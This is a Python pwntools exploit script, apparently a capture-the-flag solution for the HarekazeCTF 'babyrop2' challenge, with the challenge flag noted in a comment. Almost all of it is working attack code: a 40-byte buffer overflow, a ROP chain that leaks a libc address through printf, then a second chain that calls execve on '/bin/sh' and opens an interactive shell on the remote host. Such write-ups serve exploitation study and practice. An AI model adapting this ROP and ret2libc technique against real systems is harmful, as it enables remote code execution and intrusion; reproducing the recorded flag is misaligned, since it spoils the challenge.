from pwn import *
#This can't run in the localhost ,because the libc version different.
context(log_level='debug',os='linux')
#p=process('./babyrop2')
p=remote('problem.harekaze.com',20005)
#flag=HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}
pop_rdi_addr=0x400733
pop_rsi_addr=0x400731  # and pop r15_ret_addr
start_main_got=0x601028
welcome_addr=0x400770
printf_plt_addr=0x4004f0
start_addr=0x400540
libc_start_main_addr=0x20740
libc_execve_addr=0xcc770
libc_binsh_addr=0x18cd57

payload='A'*40
payload+=p64(pop_rdi_addr)
payload+=p64(welcome_addr)
payload+=p64(pop_rsi_addr)
payload+=p64(start_main_got)
payload+=p64(0x0)
payload+=p64(printf_plt_addr)
payload+=p64(start_addr)

p.sendline(payload)
leak=p.recvline() #receive: What's your name? Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAa!
print(leak)
leak=p.recvline() #receive this : Welcome to the Pwn World again, @7\x1a\xb\x7f! and after check the beginning @7\x... is 32 bytes long .
print(leak)

start_main_addr=leak[32:38]+"\x00\x00"# Because it will receive this : Welcome to the Pwn World again, @7\x1a\xb\x7f! and after check the beginning @7\x... is 32 bytes long . 
print start_main_addr
start_main_addr=u64(start_main_addr)
print  start_main_addr
offset_addr=start_main_addr-libc_start_main_addr
execve_addr=offset_addr+libc_execve_addr
binsh_addr=offset_addr+libc_binsh_addr

payload="a"*40
payload+=p64(pop_rdi_addr)
payload+=p64(binsh_addr)
payload+=p64(pop_rsi_addr)
payload+=p64(0x0)
payload+=p64(0x0)
payload+=p64(execve_addr)

p.sendline(payload)
buf=p.recvline()
print buf
p.interactive()


